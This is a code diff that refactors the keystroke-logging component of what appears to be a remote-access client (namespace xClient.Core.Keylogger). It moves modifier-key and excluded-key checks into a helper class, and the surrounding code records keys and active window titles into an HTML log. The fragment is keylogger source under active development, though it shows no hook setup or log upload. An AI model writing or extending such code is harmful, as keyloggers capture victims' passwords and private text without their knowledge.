@@ -100,7 +100,7 @@ namespace xClient.Core.Keylogger
                 _logFileBuffer.Append(@"<p class=""h""><br><br>[<b>" + activeWindowTitle + "</b>]</p><br>");
             }
 
-            if (ModifierKeysSet())
+            if (LoggerHelper.IsModifierKeysSet(_pressedKeys))
             {
                 if (!_pressedKeys.Contains(e.KeyCode))
                 {
@@ -112,13 +112,7 @@ namespace xClient.Core.Keylogger
             // The keys below are excluded. If it is one of the keys below,
             // the KeyPress event will handle these characters. If the keys
             // are not any of those specified below, we can continue.
-            if (!(e.KeyCode >= Keys.A && e.KeyCode <= Keys.Z
-            || e.KeyCode >= Keys.NumPad0 && e.KeyCode <= Keys.Divide
-            || e.KeyCode >= Keys.D0 && e.KeyCode <= Keys.D9
-            || e.KeyCode >= Keys.Oem1 && e.KeyCode <= Keys.OemClear
-            || e.KeyCode >= Keys.LShiftKey && e.KeyCode <= Keys.RShiftKey
-            || e.KeyCode == Keys.CapsLock
-            || e.KeyCode == Keys.Space))
+            if (LoggerHelper.IsExcludedKey(e.KeyCode))
             {
                 // The key was not part of the keys that we wish to filter, so
                 // be sure to prevent a situation where multiple keys are pressed.
@@ -132,7 +126,7 @@ namespace xClient.Core.Keylogger
         //This method should be used to process all of our unicode characters
         private void Logger_KeyPress(object sender, KeyPressEventArgs e) //Called second
         {
-            if (ModifierKeysSet())
+            if (LoggerHelper.IsModifierKeysSet(_pressedKeys))
                 return;
 
             if (!_pressedKeyChars.Contains(e.KeyChar) || !LoggerHelper.DetectKeyHolding(_pressedKeyChars, e.KeyChar))
@@ -149,16 +143,6 @@ namespace xClient.Core.Keylogger
                 _pressedKeyChars.RemoveAt(i);
         }
 
-        private bool ModifierKeysSet()
-        {
-            return _pressedKeys.Contains(Keys.LControlKey)
-                   || _pressedKeys.Contains(Keys.RControlKey)
-                   || _pressedKeys.Contains(Keys.LMenu)
-                   || _pressedKeys.Contains(Keys.RMenu)
-                   || _pressedKeys.Contains(Keys.LWin)
-                   || _pressedKeys.Contains(Keys.RWin);
-        }
-
         private string HighlightSpecialKeys(Keys[] keys)
         {
             if (keys.Length < 1) return string.Empty;
@@ -166,10 +150,10 @@ namespace xClient.Core.Keylogger
             string[] names = new string[keys.Length];
             for (int i = 0; i < keys.Length; i++)
             {
-                names[i] = LoggerHelper.GetDisplayName(keys[i].ToString());
+                names[i] = LoggerHelper.GetDisplayName(keys[i]);
             }
 
-            if (ModifierKeysSet())
+            if (LoggerHelper.IsModifierKeysSet(_pressedKeys))
             {
                 StringBuilder specialKeys = new StringBuilder();
 
